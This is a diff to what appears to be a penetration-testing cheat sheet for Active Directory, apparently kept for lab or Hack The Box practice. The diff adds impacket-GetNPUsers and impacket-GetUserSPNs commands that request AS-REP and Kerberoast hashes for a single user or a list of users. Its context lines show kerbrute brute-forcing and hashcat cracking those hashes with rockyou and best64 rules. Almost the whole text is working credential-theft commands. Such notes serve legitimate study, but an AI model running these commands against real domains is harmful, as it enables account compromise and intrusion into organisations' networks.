@@ -18,7 +18,8 @@ cat combos.lst | ./kerbrute -d lab.ropnop.com bruteforce -
 ## AS-REP Roasting
 ```bash
 # Impacket
-sudo impacket-GetNPUsers -dc-ip 192.168.50.70  -request -outputfile hashes.asreproast corp.com/pete
+sudo impacket-GetNPUsers -dc-ip 192.168.50.70  -request -outputfile hashes.asreproast corp.com/pete (knowing the user)
+sudo impacket-GetNPUsers -request -dc-ip 10.129.46.141 -request -outputfile hashes.aesreproast -usersfile username.txt htb.local/ (have bunch of users)
 sudo hashcat -m 18200 hashes.asreproast /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
 
 # Rubeus
@@ -29,7 +30,8 @@ sudo hashcat -m 18200 hashes.asreproast /usr/share/wordlists/rockyou.txt -r /usr
 ## Kerberoasting
 ```bash
 # Impacket
-sudo impacket-GetUserSPNs -request -dc-ip 192.168.50.70 corp.com/pete
+sudo impacket-GetUserSPNs -request -dc-ip 192.168.50.70 corp.com/pete (knowing the user)
+sudo impacket-GetUserSPNs -request -dc-ip 192.168.50.70 -usersfile username.txt corp.com/ (have bunch of users)
 sudo hashcat -m 13100 hashes.kerberoast /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
 
 # Rubeus
